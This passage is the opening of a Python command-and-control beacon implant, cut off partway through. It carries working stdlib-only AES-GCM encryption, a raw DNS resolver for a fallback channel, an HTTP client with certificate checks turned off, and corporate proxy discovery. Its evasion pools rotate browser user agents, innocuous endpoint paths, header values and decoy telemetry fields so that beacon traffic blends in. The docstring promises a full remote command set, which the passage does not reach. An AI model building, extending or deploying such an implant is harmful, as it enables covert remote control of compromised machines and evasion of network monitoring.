#!/usr/bin/env python3
"""
C2 beacon with HTTPS primary and DNS fallback channels.
AES-GCM encrypted payloads, Venom-style network evasion,
full command set with result reporting.

Zero external dependencies — stdlib only.
"""

import base64
import ctypes
import ctypes.util
import hashlib
import io
import json
import logging
import os
import platform
import random
import re
import shutil
import socket
import ssl
import stat
import struct
import subprocess
import sys
import threading
import time
import urllib.error
import zipfile
import urllib.request
from pathlib import Path
from typing import Optional

logger = logging.getLogger("raccoon.c2")


# ── Stdlib AES-256-GCM via OpenSSL ctypes ──

def _load_libcrypto():
    """Load OpenSSL libcrypto. Returns None if unavailable (macOS Library Validation)."""
    if platform.system() == "Darwin":
        brew_paths = [
            "/opt/homebrew/opt/openssl/lib/libcrypto.dylib",
            "/opt/homebrew/lib/libcrypto.dylib",
            "/usr/local/opt/openssl/lib/libcrypto.dylib",
            "/usr/local/lib/libcrypto.dylib",
            "/opt/local/lib/libcrypto.dylib",
        ]
        for p in brew_paths:
            if os.path.isfile(p):
                try:
                    return ctypes.CDLL(p)
                except OSError:
                    continue
    for name in ("libcrypto-3", "libcrypto-3-x64", "libcrypto-1_1",
                 "libcrypto-1_1-x64", "libcrypto"):
        path = ctypes.util.find_library(name)
        if path:
            try:
                return ctypes.CDLL(path)
            except OSError:
                continue
    ssl_path = getattr(ssl, "_ssl", None)
    if ssl_path and hasattr(ssl._ssl, "__file__"):
        d = os.path.dirname(ssl._ssl.__file__)
        for fn in os.listdir(d):
            if "libcrypto" in fn.lower() and fn.endswith((".dll", ".so", ".dylib")):
                try:
                    return ctypes.CDLL(os.path.join(d, fn))
                except OSError:
                    continue
    ssl_dir = os.path.dirname(ssl.__file__)
    parent = os.path.dirname(ssl_dir)
    for search_dir in (ssl_dir, parent, os.path.join(parent, "DLLs"),
                       os.path.join(sys.prefix, "DLLs"),
                       os.path.join(sys.prefix, "lib")):
        if not os.path.isdir(search_dir):
            continue
        for fn in os.listdir(search_dir):
            if "libcrypto" in fn.lower() and fn.endswith((".dll", ".so", ".dylib")):
                try:
                    return ctypes.CDLL(os.path.join(search_dir, fn))
                except OSError:
                    continue
    return None


# ── Pure-Python AES-256-GCM (stdlib only, no ctypes) ──
# Used as fallback when libcrypto is unavailable (macOS Library Validation).

def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def _ghash_mul(x: bytes, h: bytes) -> bytes:
    """GF(2^128) multiplication for GHASH."""
    xi = int.from_bytes(x, "big")
    hi = int.from_bytes(h, "big")
    zi = 0
    R = 0xE1000000000000000000000000000000
    for i in range(128):
        if (xi >> (127 - i)) & 1:
            zi ^= hi
        carry = hi & 1
        hi >>= 1
        if carry:
            hi ^= R
    return zi.to_bytes(16, "big")


def _ghash(h: bytes, aad: bytes, ct: bytes) -> bytes:
    """GHASH function per NIST SP 800-38D."""
    def _pad16(data):
        r = len(data) % 16
        return data + b"\x00" * (16 - r) if r else data

    data = _pad16(aad) + _pad16(ct)
    data += (len(aad) * 8).to_bytes(8, "big") + (len(ct) * 8).to_bytes(8, "big")

    y = b"\x00" * 16
    for i in range(0, len(data), 16):
        block = data[i:i + 16]
        y = _ghash_mul(_xor(y, block), h)
    return y




# ── Pure-Python AES-256 single-block implementation ──

_AES_SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]

_AES_RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]


def _aes256_expand_key(key: bytes):
    """AES-256 key expansion → list of 15 round keys (each 16 bytes)."""
    w = list(struct.unpack(">8I", key))
    for i in range(8, 60):
        t = w[i - 1]
        if i % 8 == 0:
            t = ((t << 8) | (t >> 24)) & 0xFFFFFFFF
            t = ((_AES_SBOX[(t >> 24) & 0xFF] << 24) |
                 (_AES_SBOX[(t >> 16) & 0xFF] << 16) |
                 (_AES_SBOX[(t >> 8) & 0xFF] << 8) |
                 _AES_SBOX[t & 0xFF])
            t ^= _AES_RCON[i // 8 - 1] << 24
        elif i % 8 == 4:
            t = ((_AES_SBOX[(t >> 24) & 0xFF] << 24) |
                 (_AES_SBOX[(t >> 16) & 0xFF] << 16) |
                 (_AES_SBOX[(t >> 8) & 0xFF] << 8) |
                 _AES_SBOX[t & 0xFF])
        w.append(w[i - 8] ^ t)
    rks = []
    for r in range(15):
        rks.append(struct.pack(">4I", *w[r * 4:(r + 1) * 4]))
    return rks


def _aes256_block(key: bytes, block: bytes) -> bytes:
    """Encrypt a single 16-byte block with AES-256 (column-major state)."""
    rks = _aes256_expand_key(key)

    def xtime(a):
        return ((a << 1) ^ 0x1b) & 0xFF if a & 0x80 else (a << 1) & 0xFF

    # State is column-major: state[row][col] = block[col*4 + row]
    s = bytearray(_xor(block, rks[0]))

    for rnd in range(1, 14):
        # SubBytes
        s = bytearray(_AES_SBOX[b] for b in s)
        # ShiftRows (state[row*4+col] in our flat layout where index = col*4+row)
        # row 1: shift left 1
        s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
        # row 2: shift left 2
        s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
        # row 3: shift left 3
        s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]
        # MixColumns (operate on each column: indices col*4 .. col*4+3)
        t = bytearray(16)
        for col in range(4):
            i = col * 4
            a0, a1, a2, a3 = s[i], s[i+1], s[i+2], s[i+3]
            t[i]   = xtime(a0) ^ xtime(a1) ^ a1 ^ a2 ^ a3
            t[i+1] = a0 ^ xtime(a1) ^ xtime(a2) ^ a2 ^ a3
            t[i+2] = a0 ^ a1 ^ xtime(a2) ^ xtime(a3) ^ a3
            t[i+3] = xtime(a0) ^ a0 ^ a1 ^ a2 ^ xtime(a3)
        s = bytearray(_xor(bytes(t), rks[rnd]))

    # Final round (no MixColumns)
    s = bytearray(_AES_SBOX[b] for b in s)
    s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
    s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
    s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]
    return bytes(_xor(bytes(s), rks[14]))


def _aes_ctr_encrypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    """AES-256-CTR encryption (GCM uses CTR internally)."""
    out = bytearray()
    # GCM uses a 12-byte nonce + 4-byte big-endian counter starting at 2
    counter = 2
    for i in range(0, len(data), 16):
        cb = nonce + struct.pack(">I", counter)
        ks_block = _aes256_block(key, cb)
        chunk = data[i:i + 16]
        out.extend(_xor(chunk, ks_block[:len(chunk)]))
        counter += 1
    return bytes(out)


def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
    """Pure-Python AES-256-GCM encrypt. Returns ciphertext + 16-byte tag."""
    # H = AES(key, 0^128)
    h = _aes256_block(key, b"\x00" * 16)
    # Encrypt with CTR (counter starts at 2)
    ct = _aes_ctr_encrypt(key, nonce, plaintext)
    # GHASH
    ghash_val = _ghash(h, b"", ct)
    # Tag = GHASH XOR AES(key, nonce||0^31||1)
    j0 = nonce + b"\x00\x00\x00\x01"
    e_j0 = _aes256_block(key, j0)
    tag = _xor(ghash_val, e_j0)
    return ct + tag


def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> bytes:
    """Pure-Python AES-256-GCM decrypt. Raises ValueError on auth failure."""
    if len(ciphertext_with_tag) < 16:
        raise ValueError("Ciphertext too short")
    ct = ciphertext_with_tag[:-16]
    tag = ciphertext_with_tag[-16:]
    # H = AES(key, 0^128)
    h = _aes256_block(key, b"\x00" * 16)
    # Verify tag
    ghash_val = _ghash(h, b"", ct)
    j0 = nonce + b"\x00\x00\x00\x01"
    e_j0 = _aes256_block(key, j0)
    expected_tag = _xor(ghash_val, e_j0)
    if tag != expected_tag:
        raise ValueError("GCM authentication failed — wrong key or corrupted data")
    # Decrypt
    return _aes_ctr_encrypt(key, nonce, ct)


# ── Load libcrypto or fall back to pure-Python ──

_crypto = _load_libcrypto()
_USE_PURE_PYTHON_AES = _crypto is None

if not _USE_PURE_PYTHON_AES:
    _crypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
    _crypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
    _crypto.EVP_aes_256_gcm.restype = ctypes.c_void_p
    _crypto.EVP_EncryptInit_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_char_p, ctypes.c_char_p,
    ]
    _crypto.EVP_EncryptInit_ex.restype = ctypes.c_int
    _crypto.EVP_DecryptInit_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_char_p, ctypes.c_char_p,
    ]
    _crypto.EVP_DecryptInit_ex.restype = ctypes.c_int
    _crypto.EVP_EncryptUpdate.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
        ctypes.c_char_p, ctypes.c_int,
    ]
    _crypto.EVP_EncryptUpdate.restype = ctypes.c_int
    _crypto.EVP_DecryptUpdate.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
        ctypes.c_char_p, ctypes.c_int,
    ]
    _crypto.EVP_DecryptUpdate.restype = ctypes.c_int
    _crypto.EVP_EncryptFinal_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
    ]
    _crypto.EVP_EncryptFinal_ex.restype = ctypes.c_int
    _crypto.EVP_DecryptFinal_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
    ]
    _crypto.EVP_DecryptFinal_ex.restype = ctypes.c_int
    _crypto.EVP_CIPHER_CTX_ctrl.argtypes = [
        ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_char_p,
    ]
    _crypto.EVP_CIPHER_CTX_ctrl.restype = ctypes.c_int

EVP_CTRL_GCM_SET_IVLEN = 0x9
EVP_CTRL_GCM_GET_TAG = 0x10
EVP_CTRL_GCM_SET_TAG = 0x11
GCM_TAG_LEN = 16


def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
    if _USE_PURE_PYTHON_AES:
        return _pure_aes_gcm_encrypt(key, nonce, plaintext)
    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        raise RuntimeError("EVP_CIPHER_CTX_new failed")
    try:
        cipher = _crypto.EVP_aes_256_gcm()
        if _crypto.EVP_EncryptInit_ex(ctx, cipher, None, None, None) != 1:
            raise RuntimeError("EncryptInit_ex (cipher) failed")
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, len(nonce), None) != 1:
            raise RuntimeError("Set IV length failed")
        if _crypto.EVP_EncryptInit_ex(ctx, None, None, key, nonce) != 1:
            raise RuntimeError("EncryptInit_ex (key/iv) failed")

        outlen = ctypes.c_int(0)
        out = ctypes.create_string_buffer(len(plaintext) + 16)
        if _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), plaintext, len(plaintext)) != 1:
            raise RuntimeError("EncryptUpdate failed")
        ct_len = outlen.value

        final_buf = ctypes.create_string_buffer(16)
        final_len = ctypes.c_int(0)
        if _crypto.EVP_EncryptFinal_ex(ctx, final_buf, ctypes.byref(final_len)) != 1:
            raise RuntimeError("EncryptFinal_ex failed")
        ct_len += final_len.value

        tag = ctypes.create_string_buffer(GCM_TAG_LEN)
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LEN, tag) != 1:
            raise RuntimeError("Get tag failed")

        return out.raw[:ct_len] + tag.raw
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> bytes:
    if _USE_PURE_PYTHON_AES:
        return _pure_aes_gcm_decrypt(key, nonce, ciphertext_with_tag)
    if len(ciphertext_with_tag) < GCM_TAG_LEN:
        raise ValueError("Ciphertext too short")
    ct = ciphertext_with_tag[:-GCM_TAG_LEN]
    tag = ciphertext_with_tag[-GCM_TAG_LEN:]

    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        raise RuntimeError("EVP_CIPHER_CTX_new failed")
    try:
        cipher = _crypto.EVP_aes_256_gcm()
        if _crypto.EVP_DecryptInit_ex(ctx, cipher, None, None, None) != 1:
            raise RuntimeError("DecryptInit_ex (cipher) failed")
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, len(nonce), None) != 1:
            raise RuntimeError("Set IV length failed")
        if _crypto.EVP_DecryptInit_ex(ctx, None, None, key, nonce) != 1:
            raise RuntimeError("DecryptInit_ex (key/iv) failed")

        outlen = ctypes.c_int(0)
        out = ctypes.create_string_buffer(len(ct) + 16)
        if _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), ct, len(ct)) != 1:
            raise RuntimeError("DecryptUpdate failed")
        pt_len = outlen.value

        tag_buf = ctypes.create_string_buffer(tag)
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_LEN, tag_buf) != 1:
            raise RuntimeError("Set tag failed")

        final_buf = ctypes.create_string_buffer(16)
        final_len = ctypes.c_int(0)
        if _crypto.EVP_DecryptFinal_ex(ctx, final_buf, ctypes.byref(final_len)) != 1:
            raise ValueError("GCM authentication failed — wrong key or corrupted data")
        pt_len += final_len.value

        return out.raw[:pt_len]
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


# ── Stdlib DNS resolver (TXT + A records) ──

def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
    """Minimal DNS query using raw UDP sockets. Returns list of strings (TXT) or IPs (A)."""
    qtypes = {"A": 1, "TXT": 16}
    qtype_num = qtypes.get(qtype.upper(), 1)

    txn_id = random.randint(0, 0xFFFF)
    flags = 0x0100  # standard query, recursion desired
    header = struct.pack("!HHHHHH", txn_id, flags, 1, 0, 0, 0)

    qname = b""
    for label in name.encode().split(b"."):
        qname += struct.pack("B", len(label)) + label
    qname += b"\x00"
    question = qname + struct.pack("!HH", qtype_num, 1)  # QCLASS=IN

    packet = header + question

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(packet, (server, 53))
        data, _ = sock.recvfrom(4096)
    finally:
        sock.close()

    if len(data) < 12:
        return []

    _, resp_flags, qdcount, ancount = struct.unpack("!HHHH", data[:8])
    rcode = resp_flags & 0x0F
    if rcode != 0:
        return []

    offset = 12
    for _ in range(qdcount):
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if (length & 0xC0) == 0xC0:
                offset += 2
                break
            offset += 1 + length
        offset += 4  # QTYPE + QCLASS

    results = []
    for _ in range(ancount):
        if offset >= len(data):
            break
        if (data[offset] & 0xC0) == 0xC0:
            offset += 2
        else:
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    offset += 1
                    break
                offset += 1 + length

        if offset + 10 > len(data):
            break
        rtype, rclass, ttl, rdlength = struct.unpack("!HHIH", data[offset:offset + 10])
        offset += 10
        rdata = data[offset:offset + rdlength]
        offset += rdlength

        if rtype == 1 and len(rdata) == 4:  # A record
            results.append(f"{rdata[0]}.{rdata[1]}.{rdata[2]}.{rdata[3]}")
        elif rtype == 16:  # TXT record
            txt_offset = 0
            txt_parts = []
            while txt_offset < len(rdata):
                txt_len = rdata[txt_offset]
                txt_offset += 1
                txt_parts.append(rdata[txt_offset:txt_offset + txt_len])
                txt_offset += txt_len
            results.append(b"".join(txt_parts).decode("utf-8", errors="replace"))

    return results


# ── Stdlib HTTP client ──

class _HttpSession:
    """Minimal HTTP session using urllib — replaces requests.Session."""

    def __init__(self):
        self.proxies: dict = {}
        self.trust_env: bool = True
        self._cookie_jar = urllib.request.HTTPCookieProcessor()

    def _build_opener(self):
        handlers = [self._cookie_jar]
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        handlers.append(urllib.request.HTTPSHandler(context=ssl_ctx))

        if self.proxies:
            handlers.append(urllib.request.ProxyHandler(self.proxies))
        elif not self.trust_env:
            handlers.append(urllib.request.ProxyHandler({}))

        return urllib.request.build_opener(*handlers)

    def post(self, url: str, json_data: dict, headers: dict,
             timeout: float = 30) -> "_HttpResponse":
        body = json.dumps(json_data, separators=(",", ":")).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        for k, v in headers.items():
            req.add_header(k, v)
        if "Content-Type" not in headers:
            req.add_header("Content-Type", "application/json")

        opener = self._build_opener()
        try:
            resp = opener.open(req, timeout=timeout)
            return _HttpResponse(resp.getcode(), resp.read())
        except urllib.error.HTTPError as e:
            return _HttpResponse(e.code, e.read() if hasattr(e, "read") else b"")
        except urllib.error.URLError as e:
            if "proxy" in str(e.reason).lower() or "tunnel" in str(e.reason).lower():
                raise _ProxyError(str(e.reason)) from e
            raise

    def head(self, url: str, timeout: float = 10) -> "_HttpResponse":
        req = urllib.request.Request(url, method="HEAD")
        opener = self._build_opener()
        try:
            resp = opener.open(req, timeout=timeout)
            return _HttpResponse(resp.getcode(), b"")
        except urllib.error.HTTPError as e:
            return _HttpResponse(e.code, b"")


class _HttpResponse:
    def __init__(self, status_code: int, body: bytes):
        self.status_code = status_code
        self._body = body

    def json(self) -> dict:
        return json.loads(self._body)


class _ProxyError(Exception):
    pass


# ── Proxy discovery ──

class ProxyDiscovery:
    """Discovers HTTP/HTTPS proxies from environment, system settings, PAC/WPAD, and px."""

    def __init__(self):
        self._discovered: list[dict] = []
        self._active_proxy: Optional[dict] = None

    def discover_all(self) -> list[dict]:
        self._discovered = []
        self._detect_px_proxy()
        self._detect_env_proxy()
        self._detect_system_proxy()
        self._detect_wpad()
        seen = set()
        unique = []
        for p in self._discovered:
            key = p.get("url", "")
            if key and key not in seen:
                seen.add(key)
                unique.append(p)
        self._discovered = unique
        return self._discovered

    @property
    def proxies(self) -> list[dict]:
        return self._discovered

    @property
    def active(self) -> Optional[dict]:
        return self._active_proxy

    def get_urllib_proxies(self) -> Optional[dict]:
        if not self._active_proxy:
            return None
        url = self._active_proxy["url"]
        return {"http": url, "https": url}

    def select_working(self, test_url: str, timeout: float = 10) -> Optional[dict]:
        for proxy in self._discovered:
            try:
                proxy_handler = urllib.request.ProxyHandler({
                    "http": proxy["url"], "https": proxy["url"],
                })
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
                opener = urllib.request.build_opener(
                    proxy_handler,
                    urllib.request.HTTPSHandler(context=ssl_ctx),
                )
                req = urllib.request.Request(test_url, method="HEAD")
                resp = opener.open(req, timeout=timeout)
                if resp.getcode() < 500:
                    self._active_proxy = proxy
                    logger.info("Proxy working: %s (%s)", proxy["url"], proxy["source"])
                    return proxy
            except urllib.error.HTTPError as e:
                if e.code < 500:
                    self._active_proxy = proxy
                    logger.info("Proxy working: %s (%s)", proxy["url"], proxy["source"])
                    return proxy
            except Exception:
                logger.debug("Proxy failed: %s", proxy["url"])
        self._active_proxy = None
        return None

    def _detect_px_proxy(self):
        for port in (3128, 8080, 8888):
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect(("127.0.0.1", port))
                self._discovered.append({
                    "url": f"http://127.0.0.1:{port}",
                    "source": f"px-proxy (localhost:{port})",
                    "auth": "ntlm-passthrough",
                })
            except Exception:
                pass
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass

    def _detect_env_proxy(self):
        for var in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy",
                     "ALL_PROXY", "all_proxy"):
            val = os.environ.get(var, "").strip()
            if val:
                if not val.startswith(("http://", "https://", "socks")):
                    val = "http://" + val
                self._discovered.append({
                    "url": val,
                    "source": f"env:{var}",
                    "auth": "from-url" if "@" in val else "none",
                })

    def _detect_system_proxy(self):
        if platform.system() == "Windows":
            self._detect_windows_proxy()
        elif platform.system() == "Darwin":
            self._detect_macos_proxy()
        else:
            self._detect_linux_proxy()

    def _detect_windows_proxy(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
            enabled, _ = winreg.QueryValueEx(key, "ProxyEnable")
            if enabled:
                server, _ = winreg.QueryValueEx(key, "ProxyServer")
                if server:
                    if "=" in server:
                        for part in server.split(";"):
                            if "=" in part:
                                proto, addr = part.split("=", 1)
                                if proto.lower() in ("http", "https"):
                                    url = addr if addr.startswith("http") else f"http://{addr}"
                                    self._discovered.append({
                                        "url": url, "source": "windows-registry",
                                        "auth": "ntlm-possible",
                                    })
                    else:
                        url = server if server.startswith("http") else f"http://{server}"
                        self._discovered.append({
                            "url": url, "source": "windows-registry",
                            "auth": "ntlm-possible",
                        })
            try:
                pac_url, _ = winreg.QueryValueEx(key, "AutoConfigURL")
                if pac_url:
                    self._discovered.append({
                        "url": pac_url, "source": "windows-pac",
                        "auth": "pac", "is_pac": True,
                    })
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
        except Exception:
            pass

    def _detect_linux_proxy(self):
        try:
            r = subprocess.run(
                ["gsettings", "get", "org.gnome.system.proxy", "mode"],
                capture_output=True, text=True, timeout=3,
            )
            mode = r.stdout.strip().strip("'")
            if mode == "manual":
                for proto in ("http", "https"):
                    host_r = subprocess.run(
                        ["gsettings", "get", f"org.gnome.system.proxy.{proto}", "host"],
                        capture_output=True, text=True, timeout=3,
                    )
                    port_r = subprocess.run(
                        ["gsettings", "get", f"org.gnome.system.proxy.{proto}", "port"],
                        capture_output=True, text=True, timeout=3,
                    )
                    host = host_r.stdout.strip().strip("'")
                    port = port_r.stdout.strip()
                    if host:
                        self._discovered.append({
                            "url": f"http://{host}:{port or '8080'}",
                            "source": f"gnome-{proto}",
                            "auth": "none",
                        })
            elif mode == "auto":
                pac_r = subprocess.run(
                    ["gsettings", "get", "org.gnome.system.proxy", "autoconfig-url"],
                    capture_output=True, text=True, timeout=3,
                )
                pac = pac_r.stdout.strip().strip("'")
                if pac:
                    self._discovered.append({
                        "url": pac, "source": "gnome-pac",
                        "auth": "pac", "is_pac": True,
                    })
        except Exception:
            pass

    def _detect_macos_proxy(self):
        try:
            r = subprocess.run(
                ["networksetup", "-getwebproxy", "Wi-Fi"],
                capture_output=True, text=True, timeout=5,
            )
            info = {}
            for line in r.stdout.splitlines():
                if ":" in line:
                    k, v = line.split(":", 1)
                    info[k.strip().lower()] = v.strip()
            if info.get("enabled") == "Yes":
                host = info.get("server", "")
                port = info.get("port", "8080")
                if host:
                    self._discovered.append({
                        "url": f"http://{host}:{port}",
                        "source": "macos-networksetup",
                        "auth": "none",
                    })
        except Exception:
            pass

    def _detect_wpad(self):
        try:
            addr = socket.gethostbyname("wpad")
            if addr:
                wpad_url = f"http://{addr}/wpad.dat"
                self._discovered.append({
                    "url": wpad_url, "source": "wpad-dns",
                    "auth": "wpad", "is_pac": True,
                })
        except Exception:
            pass
        try:
            fqdn = socket.getfqdn()
            parts = fqdn.split(".")
            if len(parts) > 1:
                domain = ".".join(parts[1:])
                wpad_host = f"wpad.{domain}"
                addr = socket.gethostbyname(wpad_host)
                if addr:
                    wpad_url = f"http://{addr}/wpad.dat"
                    self._discovered.append({
                        "url": wpad_url, "source": f"wpad-domain ({domain})",
                        "auth": "wpad", "is_pac": True,
                    })
        except Exception:
            pass

    def summary(self) -> str:
        if not self._discovered:
            return "No proxies discovered — using direct connection"
        lines = [f"Discovered {len(self._discovered)} proxy candidate(s):"]
        for i, p in enumerate(self._discovered):
            active = " [ACTIVE]" if p == self._active_proxy else ""
            lines.append(f"  [{i+1}] {p['url']} ({p['source']}, auth={p.get('auth','?')}){active}")
        return "\n".join(lines)


# ── Evasion pools ──

_USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux aarch64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

_URL_SUFFIXES = [
    "/collect", "/submit", "/sync", "/push", "/update",
    "/report", "/log", "/track", "/event", "/data",
    "/ping", "/health", "/status", "/check", "/query",
]

_ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en-US;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
]

_EXTRA_HEADERS = {
    "Sec-Ch-Ua-Platform": ['"Linux"', '"Windows"', '"macOS"'],
    "Sec-Fetch-Dest": ["empty", "document"],
    "Sec-Fetch-Mode": ["cors", "navigate", "no-cors"],
    "Sec-Fetch-Site": ["same-origin", "cross-site"],
    "Cache-Control": ["no-cache", "max-age=0", "no-store"],
    "Pragma": ["no-cache"],
    "DNT": ["1"],
    "X-Requested-With": ["XMLHttpRequest"],
}

_PAYLOAD_FIELDS = [
    "session_token", "auth_hash", "state_key", "nonce", "validation",
    "api_key", "request_token", "cipher_text", "payload_data", "signature",
    "trace_id", "correlation_id", "request_id", "transaction_id",
]


def _decoy_fields(n: int) -> dict:
    """Generate n random telemetry-like decoy fields."""
    pool = {
        "cpu_pct": lambda: round(random.uniform(2, 90), 1),
        "mem_mb": lambda: random.randint(64, 8192),
        "disk_pct": lambda: round(random.uniform(10, 95), 1),
        "request_count": lambda: random.randint(100, 99999),
        "session_count": lambda: random.randint(1, 5000),
        "error_rate": lambda: round(random.uniform(0, 5), 2),
